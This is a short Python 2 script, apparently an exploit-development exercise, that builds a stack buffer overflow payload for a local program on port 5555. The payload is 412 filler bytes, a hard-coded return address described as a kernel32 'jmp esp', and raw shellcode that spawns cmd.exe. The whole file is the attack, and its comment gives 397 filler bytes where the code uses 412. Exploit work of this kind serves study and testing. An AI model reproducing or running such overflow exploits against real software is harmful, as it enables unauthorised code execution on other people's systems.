import sys

# Command to connect to Simple Program via netcat.
command = 'localhost 5555'

# Payload to be entered. Divided as Randon Chars + 397 A's + Address to Kernel32 Jump to ESP Command + Shellcode to spawn another cmd.exe
PAYLOAD= (b'\x41'*412) + b'\xF5\x8B\x54\x77' + b'\xEB\x19\x31\xC0\x5B\x88\x43\x07\xBA\x61\x30\x5B\x77\x50\x53\xFF\xD2\x31\xDB\xB8\xB0\x79\x53\x77\x53\xFF\xD0\xE8\xE2\xFF\xFF\xFF\x63\x6D\x64\x2E\x65\x78\x65'

print command
print PAYLOAD